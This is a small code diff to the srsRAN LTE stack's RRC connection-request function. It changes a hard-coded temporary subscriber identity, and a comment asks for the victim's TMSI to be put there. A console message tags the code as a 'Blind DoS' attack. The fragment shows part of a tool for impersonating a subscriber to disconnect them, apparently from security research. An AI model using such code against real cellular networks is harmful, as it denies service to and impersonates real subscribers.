@@ -880,7 +880,7 @@ void rrc::send_con_request(srsran::establishment_cause_t cause)
     // TODO: overwrite the following with the victim TMSI
     srsran::s_tmsi_t s_tmsi;
     s_tmsi.mmec 	= 1;
-    s_tmsi.m_tmsi = 437416;
+    s_tmsi.m_tmsi = 69301;
     srsran::console("[Blind DoS] Connection request mmec: %d, m_tmsi: %d\n", s_tmsi.mmec, s_tmsi.m_tmsi);
   
     rrc::set_ue_identity(s_tmsi);
